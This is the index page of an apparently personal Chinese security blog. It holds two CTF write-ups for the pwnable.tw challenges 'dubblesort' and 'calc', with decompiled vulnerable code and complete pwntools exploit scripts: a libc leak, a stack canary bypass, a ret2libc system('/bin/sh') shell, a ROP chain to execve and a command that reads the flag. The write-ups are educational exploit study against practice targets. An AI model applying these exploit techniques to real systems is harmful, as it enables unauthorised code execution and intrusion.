<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <title>Y11en</title>
    
<link rel="stylesheet" href="/css/style.css">

    
<link rel="stylesheet" href="/css/gitment.css">

    <link rel="stylesheet" type="text/css" href="//at.alicdn.com/t/font_859455_eaq7v6w8ktj.css">
<meta name="generator" content="Hexo 4.2.0"></head>
<body>
<header class="header">
    <div class="header-inner">
        <div class="header-title">

        </div>
        <nav class="header-nav">
            
            <a href="/" class="header-nav-link" >
                首页
            </a>
            

            
            <a href="/archives" class="header-nav-link">
                归档
            </a>
            

            
            <a href="/tags" class="header-nav-link">
                标签
            </a>
            

            
            <a href="/about/" class="header-nav-link">
                关于
            </a>
            
        </nav>
    </div>
</header>
<header class="mobile-header">
    <div class="mobile-nav">
        <div class="mobile-nav-icon">
            <span></span>
            <span></span>
            <span></span>
        </div>
        <div class="mobile-nav-title">
            <a href="/" class="mobile-nav-title-link">y11en's Blog</a>
        </div>

    </div>
    <nav class="mobile-menu">
        <ul class="mobile-menu-list">
            <li class="mobile-menu-item">
                <i class="iconfont icon-home"></i>
                <a href="/" class="mobile-nav-link">首页</a>
            </li>
            <li class="mobile-menu-item">
                <i class="iconfont icon-archive"></i>
                <a href="/archives" class="mobile-nav-link">归档</a>
            </li>
            <li class="mobile-menu-item">
                <i class="iconfont icon-tag"></i>
                <a href="/tags" class="mobile-nav-link">标签</a>
            </li>
            <li class="mobile-menu-item">
                <i class="iconfont icon-about"></i>
                <a href="/about/" class="mobile-nav-link">关于</a>
            </li>
        </ul>
    </nav>
</header>
<div class="main">
    <div class="content-inner">
        <div class="posts">
    
        <article class="post-abstract">
            <div class="post-title">
                <h2><a class="post-title-link" href="/2018/03/31/%E9%99%86%E7%BB%AD%E6%96%B0%E5%A2%9E%E6%97%A7%E6%96%87%E7%AB%A0/">陆续新增旧文章中</a></h2>
            </div>
            <div class="post-meta">
                <span class="post-time">2018-03-31</span>
                
            </div>
            <div class="post-content">
                
                    <p>Because经营不善，之前farbox的博客倒闭…<br>So最近需要将一些旧文章转过来，因为之前的排版不规范，需要手动调整文章格式，较为费事 :-(</p>

                
            </div>
        </article>
    
        <article class="post-abstract">
            <div class="post-title">
                <h2><a class="post-title-link" href="/2018/01/13/%E2%80%9C%E6%9D%9F%E5%8F%91%E5%B0%91%E5%B9%B4%E2%80%9DEQNEDT32%E7%9A%84%E9%99%A8%E8%90%BD/">“束发少年”EQNEDT32的陨落</a></h2>
            </div>
            <div class="post-meta">
                <span class="post-time">2018-01-13</span>
                
                <span class="post-category">
                    
                    <a class="category" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
                    
                </span>
                
            </div>
            <div class="post-content">
                
                    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由非正经分析人员在非工作时间以非常规角度描述的非真实故事。<br>故事剧情纯属虚构，如有雷同，纯属搞事。</p>
                    <div class="read-more">
                        <a href="/2018/01/13/%E2%80%9C%E6%9D%9F%E5%8F%91%E5%B0%91%E5%B9%B4%E2%80%9DEQNEDT32%E7%9A%84%E9%99%A8%E8%90%BD/" class="read-more-link">
                            阅读全文
                            <i class="iconfont icon-readmore"></i>
                        </a>
                    </div>
                
            </div>
        </article>
    
        <article class="post-abstract">
            <div class="post-title">
                <h2><a class="post-title-link" href="/2017/12/13/pwnable-tw-dubblesort/">pwnable.tw-dubblesort</a></h2>
            </div>
            <div class="post-meta">
                <span class="post-time">2017-12-13</span>
                
            </div>
            <div class="post-content">
                
                    <h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>题目地址<code>https://pwnable.tw/challenge/#4</code><br>这道题目是一个冒泡排序的小程序，主要流程是这样的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">y11en@ubuntu:~/Desktop/ctf/pwnable.tw$ ./dubblesort </span><br><span class="line">What your name :nottellyou</span><br><span class="line">Hello nottellyou</span><br><span class="line">,How many numbers <span class="keyword">do</span> you what to sort :4</span><br><span class="line">Enter the 0 number : 6</span><br><span class="line">Enter the 1 number : 7</span><br><span class="line">Enter the 2 number : 1</span><br><span class="line">Enter the 3 number : 2</span><br><span class="line">Processing......</span><br><span class="line">Result :</span><br><span class="line">1 2 6 7 </span><br><span class="line"></span><br><span class="line"><span class="comment">### 检查下保护</span></span><br><span class="line">y11en@ubuntu:~/Desktop/ctf/pwnable.tw$ checksec dubblesort </span><br><span class="line">[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.</span><br><span class="line">[*] <span class="string">'/home/y11en/Desktop/ctf/pwnable.tw/dubblesort'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<p>题目有2处输入，一处是输入name，另一处是输入排序数组的信息项数和项信息。</p>
<h3 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h3><p>在name输入的地方，由于没有初始化栈数据，导致打印name时后面栈上数据被泄露</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> name[<span class="number">16</span>]; <span class="comment">// [esp+3Ch] [ebp-50h]</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// [esp+7Ch] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">v12 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">sub_8B5();</span><br><span class="line">__printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"What your name :"</span>, v8);</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, name, <span class="number">0x40</span>u);                         <span class="comment">// 未初始化内存</span></span><br><span class="line">__printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"Hello %s,How many numbers do you what to sort :"</span>, (<span class="keyword">int</span>)name);</span><br></pre></td></tr></table></figure>
<h3 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h3><p>在输入待排序项时，只有8个元素的的数组作为缓存，而实际待排序个数由用户输入 ,当这个大小 &gt;8时，打印栈后数据，当然在其排序逻辑中，可以越界写数据。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> v10[<span class="number">8</span>]; <span class="comment">// [esp+1Ch] [ebp-70h]</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  __isoc99_scanf((<span class="keyword">int</span>)<span class="string">"%u"</span>, (<span class="keyword">int</span>)&amp;numcount);</span><br><span class="line">  idx = numcount;</span><br><span class="line">  <span class="keyword">if</span> ( numcount )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v10;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"Enter the %d number : "</span>, v5);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      __isoc99_scanf((<span class="keyword">int</span>)<span class="string">"%u"</span>, (<span class="keyword">int</span>)v4);       <span class="comment">// 输入非数字导致该函数不执行实际功能</span></span><br><span class="line">      ++v5;</span><br><span class="line">      idx = numcount;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( numcount &gt; v5 );</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="栈数据泄露"><a href="#栈数据泄露" class="headerlink" title="栈数据泄露"></a>栈数据泄露</h3><p><code>scanf(&quot;%u&quot;,&amp;x)</code> 中%u是输入无符号整型的格式符。<br>为了保证只覆盖需要的数据(跳过stack cookie)，我们需要知道在%u的格式符下，输入除去数字外的字符时不会被接收(不产生赋值操作)，但只输入”+””-“可以被接收并且不产生赋值操作。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">y11en@ubuntu:~/Desktop/ctf/pwnable.tw$ ./dubblesort </span><br><span class="line">What your name :a</span><br><span class="line">Hello a</span><br><span class="line">,How many numbers <span class="keyword">do</span> you what to sort :3</span><br><span class="line">Enter the 0 number : 0</span><br><span class="line">Enter the 1 number : +</span><br><span class="line">Enter the 2 number : 0</span><br><span class="line">Processing......</span><br><span class="line">Result :</span><br><span class="line">0 0 3217242607 y11en@ubuntu:~/Desktop/ctf/pwnable.tw$</span><br></pre></td></tr></table></figure>
<h3 id="栈数据覆盖"><a href="#栈数据覆盖" class="headerlink" title="栈数据覆盖"></a>栈数据覆盖</h3><p>由于不会被接收，所以字母类型的会一直在输入缓冲区放着，导致后面的也会不接收，造成程序唰唰唰的执行到底，这就无法满足我们想跳过前面1个覆盖第2个的需要，而“+”,“-”可以!<br>既然可以控制排序数组的边界，那么我们尝试输入一个超过其缓冲大小的值，使程序越界排序(按值由小到大排序),当然排序的不是目的，覆盖关键数据才是目的，为了劫持程序流程，通过覆盖返回地址的方式，同时保证stack cookie的值不会被改，构造如下数据:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.  让 v10到cookie的值全部为0，为0的目的是保证排序时不干扰后面的值</span><br><span class="line">2.  让cookie的值不变，也即输入+或者-</span><br><span class="line">3.  覆盖返回地址</span><br></pre></td></tr></table></figure>
<h3 id="libc基址获取"><a href="#libc基址获取" class="headerlink" title="libc基址获取"></a>libc基址获取</h3><ul>
<li><p>方式一<br>通过获取程序主函数的返回地址，可以计算得到 __libc_start_main 的地址，由于提供了so文件，我们可以换算得到基址，但这就使得我们需要让程序的返回地址依然返回的程序主流程中，但这个貌似比较难，首先你得知道程序入口地址实际是什么</p>
</li>
<li><p>方式二<br>通过调试，我们可以发现在name的后面有一个存在libc中的地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20wx 0xbfffefdc</span><br><span class="line">0xbfffefdc:	0x0000fec7	0xbffff2ab	0x0000002f	0x0000009e</span><br><span class="line">0xbfffefec:	0x00000016	0x00008000	[0xb7fbb000]0xb7fb9244</span><br><span class="line">0xbfffeffc:	0x80000601	0x800007a9	0x80001fa0	0x00000001</span><br><span class="line">0xbffff00c:	0x80000b72	0x00000001	0xbffff0d4	0xbffff0dc</span><br><span class="line">0xbffff01c:	0x84cb9400	0xb7fbb3dc	0xbffff29b	0x80000b2b</span><br></pre></td></tr></table></figure>
<p>通过<code>vmmap 命令</code>在调试时查看libc的实际地址是 <code>0xb7e09000,</code>，相差<code>0x1b2000</code>，再通过readelf -S 看看本机libc这个地址是什么，再反查目标机器的地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                                        addr   off  size</span><br><span class="line">...</span><br><span class="line">本机</span><br><span class="line">[32] .got.plt          PROGBITS        001b2000 1b1000 000030 04  WA  0   0  4</span><br><span class="line">目标机器</span><br><span class="line">[31] .got.plt          PROGBITS        001b0000 1af000 000030 04  WA  0   0  4</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>对比目标、目标机器的libc，可以得到如下计算目标libc基地址公式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">libc &#x3D; leakaddr - 0x01b0000</span><br></pre></td></tr></table></figure>
<p>知道这个了，通过构造大小为24非\x00字符以及，利用输入时自带的\n，覆盖掉leakaddr的低位，最后在取值时进行处理即可。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3></li>
</ul>
<ol>
<li>泄露libc地址</li>
<li>找到system, binsh地址</li>
<li>通过排序设置返回地址</li>
</ol>
<h3 id="坑在哪？"><a href="#坑在哪？" class="headerlink" title="坑在哪？"></a>坑在哪？</h3><p>这个题目的栈空间是一个比较坑的地方。<br>在布置栈分布时候，发现我们覆盖的返回地址与实际的返回地址存在偏差，而且通过数次的测试发现这个值有时会变，苦思冥想了很久，一开始以为是如下的主函数结束代码导致的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.<span class="built_in">text</span>:<span class="number">00000B</span>10 loc_B10:                                ; CODE XREF: main+<span class="number">146</span>↑j</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000B</span>10                 lea     esp, [ebp<span class="number">-0</span>Ch]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000B</span>13                 pop     ebx</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000B</span>14                 pop     esi</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000B</span>15                 pop     edi</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000B</span>16                 pop     ebp</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000B</span>17                 retn</span><br></pre></td></tr></table></figure>
<p>但是，经过我一而再再而三的计算，发现并不是，因为这个栈的空间就是这样平着的，最后发现是函数开头的时候，对esp进行了对齐操作，这样在很大情况下，使得esp会丢失掉部分字节，而ida不知道啊，这也和上面不常见的<code>lea     esp, [ebp-0Ch]</code>进行了对照。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.<span class="built_in">text</span>:<span class="number">000009</span>C3                 push    ebp</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000009</span>C4                 mov     ebp, esp</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000009</span>C6                 push    edi</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000009</span>C7                 push    esi</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000009</span>C8                 push    ebx</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000009</span>C9                 <span class="keyword">and</span>     esp, <span class="number">0F</span>FFFFFF0h ; 这个 真的 我f*ck</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000009</span>CC                 add     esp, <span class="number">0F</span>FFFFF80h</span><br></pre></td></tr></table></figure>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>最终的利用代码如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line">printf_plt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">LOCALFILE = <span class="string">'./dubblesort'</span></span><br><span class="line">HOST = <span class="string">'chall.pwnable.tw'</span></span><br><span class="line">PORT = <span class="number">10101</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">	p = process(LOCALFILE)</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give_me_system_binsh</span><span class="params">(libc_base , libso)</span>:</span></span><br><span class="line">	libc=ELF(libso)</span><br><span class="line">	system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">	binsh = libc_base + next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">	<span class="keyword">return</span> system_addr , binsh</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaklibc</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	p.recvuntil(<span class="string">"What your name :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"AAAA"</span>*<span class="number">6</span>)</span><br><span class="line">	buf = p.recvuntil(<span class="string">"do you what to sort :"</span>).split(<span class="string">","</span>)[<span class="number">0</span>]</span><br><span class="line">	b = buf.split(<span class="string">'\n'</span>)[<span class="number">1</span>]	</span><br><span class="line">	libaddr = u32(<span class="string">"\x00"</span>+b[:<span class="number">3</span>])</span><br><span class="line">	<span class="keyword">if</span> DEBUG:</span><br><span class="line">		libaddr -= <span class="number">0x1b2000</span>	<span class="comment">#fix</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		libaddr -= <span class="number">0x1b0000</span>	<span class="comment">#fix</span></span><br><span class="line">	<span class="keyword">print</span> (hex(libaddr))</span><br><span class="line">	<span class="keyword">return</span> libaddr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dubblesort</span><span class="params">(system_addr , binsh)</span>:</span></span><br><span class="line">	<span class="comment">#能不能pwn看脸</span></span><br><span class="line">	<span class="keyword">print</span> (<span class="string">"[+] dubblesort &gt;&gt;&gt;"</span>)</span><br><span class="line">	p.sendline(<span class="string">"36"</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">36</span>):</span><br><span class="line">		<span class="keyword">print</span> (p.recvuntil(<span class="string">"number : "</span>))</span><br><span class="line">		<span class="keyword">if</span> i == <span class="number">24</span> : d = <span class="string">"+"</span></span><br><span class="line">		<span class="keyword">elif</span> i&gt;=<span class="number">25</span> <span class="keyword">and</span> i &lt;= <span class="number">33</span>: </span><br><span class="line">			<span class="keyword">if</span> i == <span class="number">28</span>:</span><br><span class="line">				d = <span class="string">"+"</span>	<span class="comment"># +</span></span><br><span class="line">			<span class="keyword">if</span> i == <span class="number">29</span>:</span><br><span class="line">				d = str(system_addr)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				d = str(system_addr)	<span class="comment">#system_addr		</span></span><br><span class="line">		<span class="keyword">elif</span> i == <span class="number">34</span> <span class="keyword">or</span> i == <span class="number">35</span>: d= str(binsh)	<span class="comment">#binsh</span></span><br><span class="line">		<span class="keyword">else</span>: d = <span class="string">"0"</span></span><br><span class="line">		print(d)</span><br><span class="line">		p.sendline(d)</span><br><span class="line">	p.recvuntil(<span class="string">"Processing......"</span>)</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	time.sleep(<span class="number">2</span>)</span><br><span class="line">	<span class="keyword">print</span> (p.recvuntil(<span class="string">"Result :"</span>))</span><br><span class="line">	<span class="keyword">print</span> (p.recv())</span><br><span class="line">	<span class="keyword">print</span> (<span class="string">"[+] dubblesort &lt;&lt;&lt;"</span>)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	libc = leaklibc()</span><br><span class="line">	<span class="keyword">if</span> DEBUG:</span><br><span class="line">		s , sh = give_me_system_binsh(libc , <span class="string">"/lib/i386-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		s , sh = give_me_system_binsh(libc , <span class="string">"./libc_32.so_dubblesort.6"</span>)</span><br><span class="line">	<span class="keyword">print</span> ((s) , (sh))	</span><br><span class="line">	dubblesort(s,sh)</span><br><span class="line">	p.sendline(<span class="string">'cat /home/dubblesort/flag'</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
                
            </div>
        </article>
    
        <article class="post-abstract">
            <div class="post-title">
                <h2><a class="post-title-link" href="/2017/12/10/pwnable-tw-calc/">pwnable.tw-calc</a></h2>
            </div>
            <div class="post-meta">
                <span class="post-time">2017-12-10</span>
                
            </div>
            <div class="post-content">
                
                    <h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>题目地址: <a href="https://pwnable.tw/challenge/#3" target="_blank" rel="noopener">https://pwnable.tw/challenge/#3</a><br>这道题是一个计算器的小程序，通过输入表达式进行求值，不支持括号</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">y11en@ubuntu:~/Desktop/ctf/pwnable.tw$ ./calc </span><br><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">1+1</span><br><span class="line">2</span><br><span class="line">1+6</span><br><span class="line">7</span><br><span class="line">8*6</span><br><span class="line">48</span><br><span class="line"></span><br><span class="line">Merry Christmas!</span><br><span class="line">y11en@ubuntu:~/Desktop/ctf/pwnable.tw$ </span><br><span class="line"></span><br><span class="line">[*] <span class="string">'/home/y11en/Desktop/ctf/pwnable.tw/calc'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>通过简单测试，发现输入<code>+100000</code>会造成程序崩溃，调试确定问题原因是发生在<code>calc</code>函数内部</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned int calc()</span><br><span class="line">&#123;</span><br><span class="line">  int value_stack[101]; &#x2F;&#x2F; [esp+18h] [ebp-5A0h]</span><br><span class="line">  char inputBuf; &#x2F;&#x2F; [esp+1ACh] [ebp-40Ch]</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; [esp+5ACh] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    bzero(&amp;inputBuf, 1024u);</span><br><span class="line">    if ( !get_expr(&amp;inputBuf, 1024) )           &#x2F;&#x2F; 输入</span><br><span class="line">      break;</span><br><span class="line">    init_pool(value_stack);</span><br><span class="line">    if ( parse_expr(&amp;inputBuf, value_stack) )   &#x2F;&#x2F; parser</span><br><span class="line">    &#123;</span><br><span class="line">      printf((const char *)&amp;unk_80BF804, value_stack[value_stack[0] - 1 + 1]); &#x2F;&#x2F;这里发生了crash</span><br><span class="line">      fflush(stdout);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>value_stack</code>是运算变量栈，用于存放输入的运算符两边的数字，例如输入<code>1+3</code>,则value_stack的变化是这样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">value_stack 的运算值栈变化</span><br><span class="line">value_stack[0] 是标记当前运算结果,value_stack[1...n] 是实际值</span><br><span class="line">输入1  -&gt;  1|1|</span><br><span class="line">输入&#96;+&#96; 这里会进入运算符栈中</span><br><span class="line">输入3   -&gt;  2|1|3|</span><br><span class="line">计算得   value_stack[value_stack[0]-1] +&#x3D; v[value_stack[0]]  也即 1+3 &#x3D; 4，之后value_stack[0]--</span><br></pre></td></tr></table></figure>
<p>但问题来了，当我们尝试输入<code>+2</code>时变化是这样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入+</span><br><span class="line">输入1 -&gt; 1|2</span><br><span class="line">计算得 value_stack[value_stack[0]-1] +&#x3D; v[value_stack[0]]  也即  0 + 2 &#x3D; 2，0 是由于程序默认赋值,之后value_stack[0]--</span><br><span class="line">在打印的时候调用如下代码:</span><br><span class="line">  printf((const char *)&amp;unk_80BF804, value_stack[value_stack[0] - 1 + 1]); </span><br><span class="line">造成 打印value_stack[X])的效果，X是我们输入的+X中的X</span><br></pre></td></tr></table></figure>
<p>知道通过输入<code>+X</code>可以泄露打印value_stack[X]的值，那么我们可以尝试泄露stack cookie来造成栈异常，但仔细研究了一下，除了运算符那个栈可溢出，但仅限于”+-*/“，所以实际意义不大，再仔细分析，可以发现，程序还可以造成栈上任意地址写的效果，<br>发生在<code>eval</code>的函数中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_DWORD *__<span class="function">cdecl <span class="title">eval</span><span class="params">(_DWORD *value_stack, <span class="keyword">char</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="string">'+'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    value_stack[*value_stack - <span class="number">1</span>] += value_stack[*value_stack];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 &gt; <span class="string">'+'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="string">'-'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      value_stack[*value_stack - <span class="number">1</span>] -= value_stack[*value_stack];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="string">'/'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      value_stack[*value_stack - <span class="number">1</span>] /= value_stack[*value_stack];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="string">'*'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    value_stack[*value_stack - <span class="number">1</span>] *= value_stack[*value_stack];</span><br><span class="line">  &#125;</span><br><span class="line">  result = value_stack;</span><br><span class="line">  --*value_stack;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过构造<code>+X+Y</code>或者<code>+X-Y</code>,当然<code>*/</code>也能用，如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入+</span><br><span class="line">输入X   -&gt;  1|X</span><br><span class="line">输入+ 计算得到   -&gt; X|  , 也即 (*value_stack)  &#x3D; X</span><br><span class="line">输入Y   -&gt;  </span><br><span class="line">      if ( Y &gt; 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 &#x3D; (*value_stack)++;          &#x2F;&#x2F;注意这里的 ++造成后的X 变为 X + 1</span><br><span class="line">        value_stack[v4 + 1] &#x3D; Y ;             </span><br><span class="line">      &#125;</span><br><span class="line">计算得到 value_stack[(X  + 1)- 1]+&#x3D; Y</span><br><span class="line">这里需要注意的是，写X位置处的值，会把X+1处的值填充掉</span><br></pre></td></tr></table></figure>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>好了原理都知道了，一个栈上任意读，一个任意写，可以很快的pwn掉，但有一个坑在于，这里面在布置int 80利用代码时，需要</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eax&#x3D;11 # sys_execve</span><br><span class="line">ebx&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">ecx&#x3D;0</span><br><span class="line">edx&#x3D;0</span><br></pre></td></tr></table></figure>
<p>ebx需要在栈上面布置一个binsh的字符串，这就需要用到ebp了，而ebp&gt;0x80000000 !!! 坑的是输入的值是一个int类型，无法写高于0x7FFFFFFF的值(因为你不能输入-进去当数字运算)，所以这里用了一个小技巧，通过多次累加让目标值溢出，最终的利用代码如下,</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">printf_plt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">LOCALFILE = <span class="string">'./calc'</span></span><br><span class="line">HOST = <span class="string">'chall.pwnable.tw'</span></span><br><span class="line">PORT = <span class="number">10100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">	p = process(LOCALFILE)</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_int</span><span class="params">(off)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">"+&#123;0&#125;"</span>.format(off))</span><br><span class="line">	x = p.recv()</span><br><span class="line">	x = int(x)</span><br><span class="line">	<span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_int</span><span class="params">(off,dat,op=<span class="string">'+'</span>)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">"+&#123;0&#125;&#123;1&#125;&#123;2&#125;"</span>.format(off,op,dat))</span><br><span class="line">	p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x080701AA : pop edx ; ret</span></span><br><span class="line"><span class="comment">#0x0805c34b : pop eax ; ret</span></span><br><span class="line"><span class="comment">#0x0809E7A4 : pop ebx ; pop esi ; ret</span></span><br><span class="line"><span class="comment">#0x080701d1 : pop ecx ; pop ebx ; ret</span></span><br><span class="line"><span class="comment">#0x08070880 : _dl_sysinfo_int80</span></span><br><span class="line">pop_edx_ret =  <span class="number">0x080701AA</span></span><br><span class="line">pop_eax_ret  = <span class="number">0x0805c34b</span></span><br><span class="line">pop_ebx2_ret = <span class="number">0x0809E7A4</span></span><br><span class="line">pop_ecx2_ret = <span class="number">0x080701d1</span></span><br><span class="line">_dl_sysinfo_int80 = <span class="number">0x08070880</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#cookie 357</span></span><br><span class="line"><span class="comment">#ebp 360</span></span><br><span class="line"><span class="comment">#ret 361</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set0</span><span class="params">(off,y=<span class="number">0</span>)</span>:</span></span><br><span class="line">	x = read_int(off)</span><br><span class="line">	<span class="keyword">print</span> (<span class="string">'before: '</span> + hex((x <span class="keyword">if</span> x &gt;=<span class="number">0</span> <span class="keyword">else</span> x+<span class="number">0x100000000</span>)))</span><br><span class="line">	<span 